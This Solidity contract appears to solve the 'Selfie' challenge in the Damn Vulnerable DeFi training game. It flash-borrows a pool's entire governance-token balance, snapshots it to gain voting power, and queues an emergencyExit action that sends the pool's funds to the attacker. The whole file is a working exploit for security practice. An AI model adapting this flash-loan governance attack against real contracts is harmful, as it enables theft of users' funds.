// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./ISimpleGovernance.sol";
import "./SelfiePool.sol";
import "hardhat/console.sol";

contract SelfiePoolExp is IERC3156FlashBorrower {
    ISimpleGovernance gov;
    SelfiePool pool;
    uint256 actionId;
    address owner;

    constructor(address _gov, address _pool) {
        gov = ISimpleGovernance(_gov);
        pool = SelfiePool(_pool);
        owner = msg.sender;
    }

    function exp() external {
        pool.flashLoan(
            this,
            address(pool.token()),
            ERC20(pool.token()).balanceOf(address(pool)),
            ""
        );
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external override returns (bytes32) {
        DamnValuableTokenSnapshot(token).approve(
            address(pool),
            type(uint256).max
        );
        DamnValuableTokenSnapshot(token).snapshot();
        actionId = gov.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", owner)
        );
        console.log("onFlashLoan amount %s actionId %s", amount, actionId);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function executeAction() external {
        gov.executeAction(actionId);
    }
}
